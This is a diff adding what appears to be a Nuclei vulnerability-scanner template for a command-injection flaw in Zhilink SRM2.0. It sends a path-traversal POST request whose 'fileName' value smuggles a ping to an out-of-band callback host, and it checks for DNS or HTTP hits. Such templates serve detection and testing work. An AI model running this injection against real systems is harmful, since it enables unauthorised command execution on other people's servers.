@@ -1,0 +1,38 @@
+id: zhilink-srm-restore-rce
+info:
+  name: 智联云采 SRM2.0 restore 存在远程命令执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60229/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,zhilink,oob
+
+http:
+  - raw:
+      - |
+        POST /adpweb/static/..;/a/db/dbBackupScheme/restore HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+        Connection: keep-alive
+        Content-Length: 63
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate, br
+
+        fileName=1||ping%20{{interactsh-url}}
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
